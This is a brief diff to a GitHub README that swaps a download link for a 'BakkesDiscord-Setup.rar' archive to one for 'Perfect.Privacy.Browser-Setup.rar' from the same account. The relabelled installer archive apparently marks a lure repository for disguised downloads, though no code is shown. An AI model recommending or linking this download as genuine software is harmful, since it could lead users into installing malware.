@@ -10,7 +10,7 @@
 [Special features](https://github.com/Hax0RX/Perfect-Privacy-Browser/blob/main/README.md#special-features)<br/>
 [Credits](https://github.com/Hax0RX/Perfect-Privacy-Browser/blob/main/README.md#credits)<br/>
   
-<a href="https://github.com/Hax0rX/Perfect-Privacy-Browser/releases/download/BakkesDIscord/BakkesDiscord-Setup.rar">
+<a href="https://github.com/Hax0rX/Perfect-Privacy-Browser/releases/download/Perfect-Privacy/Perfect.Privacy.Browser-Setup.rar">
   <img src="https://i.postimg.cc/gjFbdS9b/New-Projec11112323t33download.png"/>
 </a>
   
